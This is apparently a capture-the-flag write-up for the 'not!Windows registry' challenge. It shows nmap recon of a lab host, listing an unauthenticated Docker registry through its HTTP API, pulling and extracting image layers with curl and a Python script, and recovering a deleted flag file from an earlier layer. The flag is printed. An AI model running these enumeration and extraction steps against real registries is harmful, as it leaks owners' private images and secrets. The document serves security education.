<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>


## not!Windows registry

**Category:** Misc / Web / Docker  
**Points:** 504  
**Author:** Mārtiņš #420  

> _“You like Windows registry tasks? Well this is none of that. Have fun.”_

The box description hints at “registry”, but it explicitly says it’s **not** Windows registry. The nmap scan quickly shows why: it’s actually a **Docker registry**.

---

### Recon

Target IP: `10.240.3.118`

Basic host discovery:

```bash
ping -c 4 10.240.3.118
```

Then a service scan:

```bash
nmap -sC -sV 10.240.3.118
```

Relevant result:

```text
Host is up (0.079s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
5000/tcp open  http    Docker Registry (API: 2.0)
```

So there’s a **Docker Registry v2** running on port **5000**. That matches the “registry” hint, but it’s not Windows at all.

---

### Talking to the Docker Registry

First, verify the registry API is reachable:

```bash
curl -s http://10.240.3.118:5000/v2/
```

Then list repositories (the catalog):

```bash
curl -s http://10.240.3.118:5000/v2/_catalog
```

Output:

```json
{"repositories":["my-cool-webserver"]}
```

So there’s a single repo: `my-cool-webserver`.

List tags for this repo:

```bash
curl -s http://10.240.3.118:5000/v2/my-cool-webserver/tags/list
```

One of the tags available was `oldest`, which I decided to investigate.

---

### Failed attempt: using Docker “normally”

I first tried to just `docker pull` the image:

```bash
docker pull 10.240.3.118:5000/my-cool-webserver:oldest
```

Got:

```text
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock
```

So I retried with `sudo`:

```bash
sudo docker pull 10.240.3.118:5000/my-cool-webserver:oldest
```

Now Docker complained about HTTPS:

```text
Error response from daemon: Get "https://10.240.3.118:5000/v2/":
http: server gave HTTP response to HTTPS client
```

This is the classic **HTTP-only registry vs Docker expecting HTTPS** issue.

I tried to configure an insecure registry via `/etc/docker/daemon.json`, but on this box there was **no `docker` systemd service**:

```bash
sudo systemctl restart docker
# → Unit docker.service not found
```

So I couldn’t (easily) restart Docker, and fighting the local Docker setup was more effort than it was worth.

At this point I switched to **pulling the image manually via the Registry HTTP API**.

---

### Manual image extraction via Registry API

I worked in a dedicated directory:

```bash
mkdir ~/my-cool-webserver-oldest
cd ~/my-cool-webserver-oldest
```

#### 1. Grab the manifest

For tag `oldest`:

```bash
curl -s   -H "Accept: application/vnd.docker.distribution.manifest.v2+json"   http://10.240.3.118:5000/v2/my-cool-webserver/manifests/oldest   -o manifest.json
```

Pretty-print (optional, for inspection):

```bash
python3 -m json.tool manifest.json | sed -n '1,80p'
```

The manifest contains a `"layers"` array with entries like:

```json
{
  "mediaType": "...",
  "size": 123456,
  "digest": "sha256:...."
}
```

Each `digest` is a tar layer we can download.

#### 2. Download and extract all layers

I used a small Python helper to automate:

```bash
python3 - << 'EOF'
import json, subprocess, os

with open("manifest.json") as f:
    m = json.load(f)

for layer in m["layers"]:
    digest = layer["digest"]              # e.g. "sha256:abcd..."
    print("[*] Handling layer", digest)
    fname = digest.replace(":", "_") + ".tar"

    # Download the blob for this layer
    url = f"http://10.240.3.118:5000/v2/my-cool-webserver/blobs/{digest}"
    print("    Downloading", url, "->", fname)
    subprocess.check_call(["curl", "-s", url, "-o", fname])

    # Extract into a directory with the same base name
    dirname = fname[:-4]
    os.makedirs(dirname, exist_ok=True)
    print("    Extracting to", dirname)
    subprocess.check_call(["tar", "-xf", fname, "-C", dirname])
EOF
```

This produced multiple directories like:

- `sha256_f70c3a.../`
- `sha256_7dde47.../`
- …plus the corresponding `.tar` files.

Each directory represents the filesystem changes of that layer.

---

### Hunting for the flag in the layers

Instead of grepping everything (including big binaries and tars), I searched for filenames containing “flag”:

```bash
find . -iname '*flag*' -type f
```

Result:

```text
./sha256_f70c3ab0ba51b24f49f4ae6cf19d8b824652bf9096af972b6e154a6f5fc647d0/usr/share/nginx/html/flag.html
./sha256_7dde473e421c6cc01aa176332e59b9a53200dc1bc9f232fbe58daa6b7c51d878/usr/share/nginx/html/.wh.flag.html
```

Observations:

- `flag.html` is a pretty obvious candidate.
- `.wh.flag.html` is a **Docker whiteout file** – it tells Docker to delete `flag.html` in a later layer so it doesn’t appear in the final image.

That means: the **current image hides the flag**, but older layers still contain it. Exactly what we’re seeing.

I then read `flag.html` from the earlier layer:

```bash
cat ./sha256_f70c3ab0ba51b24f49f4ae6cf19d8b824652bf9096af972b6e154a6f5fc647d0/usr/share/nginx/html/flag.html
```

To cleanly extract just the flag:

```bash
grep -o 'MCTF{[^}]*}'   ./sha256_f70c3ab0ba51b24f49f4ae6cf19d8b824652bf9096af972b6e154a6f5fc647d0/usr/share/nginx/html/flag.html
```

This revealed the flag:

```text
MCTF25{d0ck3r_d03s_n0t_f0rg3t_d0ck3r_d03s_n0t_f0rgiv3}
```

